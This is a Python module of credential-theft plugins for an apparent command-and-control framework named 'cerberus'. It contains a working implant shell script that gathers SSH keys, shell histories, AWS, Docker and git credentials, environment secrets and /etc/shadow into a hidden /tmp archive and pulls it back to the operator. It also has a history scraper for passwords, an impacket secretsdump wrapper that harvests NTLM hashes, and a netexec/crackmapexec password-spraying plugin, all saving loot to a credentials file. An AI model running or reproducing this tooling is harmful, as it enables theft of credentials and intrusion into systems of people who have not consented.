"""Credential dump helpers — implant harvest + local operator tools.

Implant-side: scrape common credential files, browser-ish paths, history.
Operator-side: wrap secretsdump / mimikatz-style workflows when tools exist.
"""

from __future__ import annotations

import asyncio
import re
import shutil
from pathlib import Path
from typing import Any

from cerberus.core.c2 import get_c2
from cerberus.core.phase import Phase
from cerberus.core.plugin_api import OpsecLevel, Plugin, PluginMeta, register_plugin

PHASES = [Phase.PRIVESC, Phase.LATERAL, Phase.EXFIL]


def _beacon_id(kwargs: dict, server) -> str | None:
    return kwargs.get("beacon") or kwargs.get("id") or (server.active_id if server else None)


def _store_cred(evidence, target: str, username: str, secret: str, source: str, plugin: str, extra: dict | None = None):
    data = {"username": username, "secret": secret, **(extra or {})}
    evidence.add(
        kind="credential",
        target=target,
        data=data,
        source=source,
        plugin=plugin,
        confidence=0.75,
        tags=["cred"],
    )
    # also append to sessions credentials file
    try:
        cred_file = Path("sessions") / "credentials.txt"
        cred_file.parent.mkdir(parents=True, exist_ok=True)
        line = f"{username}:{secret}"
        if extra and extra.get("domain"):
            line = f"{extra['domain']}\\{username}:{secret}"
        with cred_file.open("a") as f:
            f.write(line + "\n")
    except Exception:
        pass


@register_plugin
class CredHarvestLinuxPlugin(Plugin):
    meta = PluginMeta(
        name="cred_harvest_linux",
        description="Harvest Linux creds from beacon (shadow if root, history, ssh keys, .netrc, env)",
        phase=PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=["credential"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}

        # Stage a collection script and pull interesting files via download later
        remote = r"""
set +e
OUT=/tmp/.cerberus_creds_$$
mkdir -p "$OUT"
# histories
cp ~/.bash_history "$OUT/bash_history" 2>/dev/null
cp ~/.zsh_history "$OUT/zsh_history" 2>/dev/null
# ssh
cp -r ~/.ssh "$OUT/ssh" 2>/dev/null
# netrc / config
cp ~/.netrc "$OUT/netrc" 2>/dev/null
cp ~/.aws/credentials "$OUT/aws_credentials" 2>/dev/null
cp ~/.docker/config.json "$OUT/docker_config.json" 2>/dev/null
# env snippets
env | grep -iE 'PASS|TOKEN|SECRET|KEY|AWS|API' > "$OUT/env_secrets.txt" 2>/dev/null
# shadow if readable
cp /etc/shadow "$OUT/shadow" 2>/dev/null
cp /etc/passwd "$OUT/passwd" 2>/dev/null
# git credentials
cp ~/.git-credentials "$OUT/git-credentials" 2>/dev/null
tar czf /tmp/.cerberus_creds.tgz -C /tmp "$(basename $OUT)" 2>/dev/null
echo "PACKED:/tmp/.cerberus_creds.tgz"
ls -la "$OUT" 2>/dev/null
"""
        ok = await server.task(bid, "shell", {"cmd": remote})
        # also request download of the pack
        await server.task(bid, "download", {"path": "/tmp/.cerberus_creds.tgz"})

        self.evidence.add(
            kind="credential",
            target=bid,
            data={"method": "linux_harvest", "note": "check c2_results + sessions/loot"},
            source="cred_harvest_linux",
            plugin="cred_harvest_linux",
            confidence=0.5,
            tags=["cred", "linux"],
        )
        return {
            "success": ok,
            "message": f"linux cred harvest tasked → {bid}; loot via c2_results / sessions/loot/{bid}/",
            "beacon": bid,
        }


@register_plugin
class CredFromHistoryPlugin(Plugin):
    meta = PluginMeta(
        name="cred_from_history",
        description="Parse shell history on beacon for password-like patterns",
        phase=PHASES,
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=["credential"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        remote = (
            "grep -hE 'pass(word)?=|mysql |mongo |curl.*-u |wget.*--password|sshpass|LOGIN' "
            "~/.bash_history ~/.zsh_history 2>/dev/null | tail -n 40"
        )
        ok = await server.task(bid, "shell", {"cmd": remote})
        return {
            "success": ok,
            "message": f"history scrape tasked → {bid} (review c2_results for candidates)",
            "beacon": bid,
        }


@register_plugin
class SecretsdumpPlugin(Plugin):
    meta = PluginMeta(
        name="secretsdump",
        description="Run impacket secretsdump against target (local tool; needs creds)",
        phase=PHASES,
        opsec=OpsecLevel.DANGEROUS,
        requires=[],
        produces=["credential"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        target = kwargs.get("target") or self.config.rhost
        user = kwargs.get("user") or kwargs.get("username")
        password = kwargs.get("password") or kwargs.get("pass")
        hash_ = kwargs.get("hash") or kwargs.get("nthash")
        domain = kwargs.get("domain") or self.config.domain or "."
        if not target or not user:
            return {"success": False, "message": "need target= and user= (password= or hash=)"}

        bin_path = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
        if not bin_path:
            return {
                "success": False,
                "message": "secretsdump.py / impacket-secretsdump not found on operator host",
            }

        if hash_:
            auth = f"{domain}/{user}@{target}"
            cmd = [bin_path, "-hashes", f":{hash_}", auth]
        else:
            if not password:
                return {"success": False, "message": "need password= or hash="}
            auth = f"{domain}/{user}:{password}@{target}"
            cmd = [bin_path, auth]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        text = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")

        # Parse NTLM lines: user:rid:lm:nt:::
        found = []
        for line in text.splitlines():
            m = re.search(r"([^:\\s]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32})", line)
            if m:
                u, rid, lm, nt = m.groups()
                found.append({"username": u, "rid": rid, "nthash": nt})
                _store_cred(
                    self.evidence,
                    target,
                    u,
                    nt,
                    "secretsdump",
                    "secretsdump",
                    {"domain": domain, "type": "nthash", "rid": rid},
                )

        out_path = Path("sessions") / f"secretsdump_{target}.txt"
        out_path.write_text(text[:200_000])

        return {
            "success": proc.returncode == 0 or bool(found),
            "message": f"secretsdump {target}: {len(found)} hash(es)",
            "found": found[:50],
            "log": str(out_path),
        }


@register_plugin
class CredSprayPlugin(Plugin):
    meta = PluginMeta(
        name="cred_spray",
        description="Password spray via netexec/crackmapexec if available (user= pass= or file=)",
        phase=PHASES,
        opsec=OpsecLevel.DANGEROUS,
        requires=[],
        produces=["credential"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        target = kwargs.get("target") or self.config.rhost
        protocol = kwargs.get("protocol") or "smb"
        user = kwargs.get("user")
        password = kwargs.get("password") or kwargs.get("pass")
        userfile = kwargs.get("userfile")
        if not target:
            return {"success": False, "message": "need target="}

        nxc = shutil.which("netexec") or shutil.which("nxc") or shutil.which("crackmapexec")
        if not nxc:
            return {"success": False, "message": "netexec/nxc/crackmapexec not found"}

        cmd = [nxc, protocol, target]
        if userfile:
            cmd += ["-u", userfile]
        elif user:
            cmd += ["-u", user]
        else:
            return {"success": False, "message": "need user= or userfile="}
        if password:
            cmd += ["-p", password]
        else:
            return {"success": False, "message": "need password="}

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        text = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")

        hits = [line for line in text.splitlines() if "[+]" in line or "Pwn3d" in line]
        for line in hits:
            _store_cred(
                self.evidence,
                target,
                user or "spray",
                password or "",
                "cred_spray",
                "cred_spray",
                {"raw": line[:200], "protocol": protocol},
            )

        return {
            "success": bool(hits) or proc.returncode == 0,
            "message": f"spray {protocol}://{target}: {len(hits)} hit(s)",
            "hits": hits[:30],
        }


@register_plugin
class CredShowPlugin(Plugin):
    meta = PluginMeta(
        name="cred_show",
        description="Show credentials stored in evidence + sessions/credentials.txt",
        phase=PHASES + [Phase.REPORT],
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        items = self.evidence.find(kind="credential")
        file_creds = []
        p = Path("sessions/credentials.txt")
        if p.exists():
            file_creds = [l.strip() for l in p.read_text().splitlines() if l.strip()]
        return {
            "success": True,
            "message": f"{len(items)} evidence cred(s), {len(file_creds)} file line(s)",
            "evidence": [
                {
                    "target": i.target,
                    "username": i.data.get("username"),
                    "type": i.data.get("type", "password"),
                    "source": i.provenance.source,
                }
                for i in items[:100]
            ],
            "file": file_creds[:100],
        }
